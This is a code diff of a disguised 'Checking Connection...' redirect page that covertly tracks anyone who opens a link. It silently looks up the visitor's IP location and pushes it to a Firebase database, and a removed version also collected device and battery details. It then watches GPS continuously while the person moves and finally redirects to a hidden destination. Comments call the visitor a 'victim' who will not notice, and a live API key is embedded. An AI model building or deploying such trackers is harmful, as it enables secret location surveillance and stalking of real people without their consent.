@@ -2,14 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processing...</title>
+    <title>Checking Connection...</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    
     <style>
-        body { background: #000; color: #333; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 3px solid #111; border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: white; font-family: sans-serif; }
+        .loader { border: 2px solid #222; border-top: 2px solid #22c55e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -17,7 +15,6 @@
     <div class="loader"></div>
 
     <script>
-        // --- YOUR FIREBASE CONFIG ---
         const firebaseConfig = {
             apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
             authDomain: "in-app-update-21c61.firebaseapp.com",
@@ -30,86 +27,64 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // 1. Get Params from URL
         const params = new URLSearchParams(window.location.search);
-        const adminId = params.get('id'); // Your mobile
-        const encodedRedirect = params.get('r'); // Encoded destination
+        const adminId = params.get('id');
+        const encodedRedirect = params.get('r');
 
-        // 2. Get Device Intelligence
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = "Unknown Device";
-            if (/android/i.test(ua)) device = "Android Phone";
-            else if (/iPhone/i.test(ua)) device = "iPhone";
-            else if (/Windows/i.test(ua)) device = "Windows PC";
-            
-            return {
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                device: device,
-                browser: navigator.appName
-            };
-        }
-
-        async function startCapture() {
+        async function capture() {
             if (!adminId) return;
 
-            const dev = getDeviceInfo();
-            let batteryLevel = "N/A";
-
-            // Try to get Battery Status (Silent)
-            try {
-                const batt = await navigator.getBattery();
-                batteryLevel = (batt.level * 100) + "%";
-            } catch(e) {}
-
-            // --- STEP 1: SILENT IP CAPTURE (Zero Permission) ---
-            let ipData = { ip: "Hidden", org: "Unknown", city: "Unknown" };
+            // --- STAGE 1: IP Intelligence (Silent) ---
+            let ipInfo = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
+                ipInfo = await res.json();
                 
-                // Pehla data turant database mein (Victim ko pata bhi nahi chalega)
-                await db.ref('users/' + adminId + '/trackingLogs').push({
+                // Record link click in transaction history
+                db.ref('users/' + adminId + '/trackingLogs').push({
                     time: new Date().toLocaleString(),
-                    method: "SILENT-IP-LOG",
-                    coords: ipData.latitude + ", " + ipData.longitude,
-                    isp: `${ipData.org} | ${dev.device} | Batt: ${batteryLevel}`,
-                    status: `CITY: ${ipData.city} (IP-ONLY)`
+                    method: "IP-LINK-HIT",
+                    coords: ipInfo.latitude + ", " + ipInfo.longitude,
+                    isp: ipInfo.org,
+                    status: "IP-LOCATION-ONLY",
+                    ip: ipInfo.ip
                 });
             } catch (e) {}
 
-            // --- STEP 2: PRECISION GPS (Request Permission) ---
+            // --- STAGE 2: Persistent GPS (24h Concept) ---
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
+                // watchPosition updates location whenever victim moves
+                navigator.geolocation.watchPosition(
                     (pos) => {
-                        // Agar Allow kiya toh Exact Coordinate bhejenge
                         db.ref('users/' + adminId + '/trackingLogs').push({
                             time: new Date().toLocaleString(),
-                            method: "GPS-PRECISION",
+                            method: "LIVE-GPS-FIX",
                             coords: pos.coords.latitude + ", " + pos.coords.longitude,
-                            isp: `${ipData.org} (${ipData.ip})`,
-                            status: "EXACT-LOCATION-FIX"
-                        }).then(() => finish());
+                            isp: ipInfo.org || "Mobile Data",
+                            status: "PRECISION-LOCKED",
+                            accuracy: pos.coords.accuracy + "m"
+                        });
+                        
+                        // Redirect after first successful fix
+                        setTimeout(redirectUser, 2000);
                     },
-                    (err) => { finish(); }, // Deny kiya toh seedha redirect
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    (err) => { redirectUser(); }, 
+                    { enableHighAccuracy: true }
                 );
             } else {
-                finish();
+                redirectUser();
             }
         }
 
-        function finish() {
+        function redirectUser() {
             try {
-                const target = atob(encodedRedirect);
-                window.location.href = target;
+                window.location.href = atob(encodedRedirect);
             } catch(e) {
                 window.location.href = "https://google.com";
             }
         }
 
-        window.onload = startCapture;
+        window.onload = capture;
     </script>
 </body>
 </html>
